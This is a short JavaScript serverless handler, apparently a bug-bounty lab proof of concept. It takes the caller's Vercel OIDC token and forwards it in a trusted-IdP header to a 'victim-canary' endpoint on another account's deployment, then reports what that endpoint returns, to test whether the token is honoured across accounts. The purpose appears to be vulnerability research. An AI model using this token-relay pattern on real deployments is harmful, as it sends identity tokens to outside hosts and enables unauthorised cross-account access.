export default async function handler(req, res) {
  const token = req.headers["x-vercel-oidc-token"];

  if (!token) {
    return res.status(401).json({
      error: "OIDC token unavailable",
      caller_environment: process.env.VERCEL_ENV
    });
  }

  const target = "https://bb-vercel-lab-2026-9qg8-git-main-hackerone-b-by-moraz1.vercel.app/api/victim-canary";

  try {
    const response = await fetch(target, {
      headers: {
        "x-vercel-trusted-oidc-idp-token": token
      },
      redirect: "manual",
      cache: "no-store"
    });

    const body = await response.text();

    return res.status(200).json({
      caller_project: "ACCOUNT_A",
      caller_environment: process.env.VERCEL_ENV,
      target_status: response.status,
      target_response: body.slice(0, 1000)
    });
  } catch (error) {
    return res.status(502).json({
      error: String(error.message).slice(0, 300)
    });
  }
}
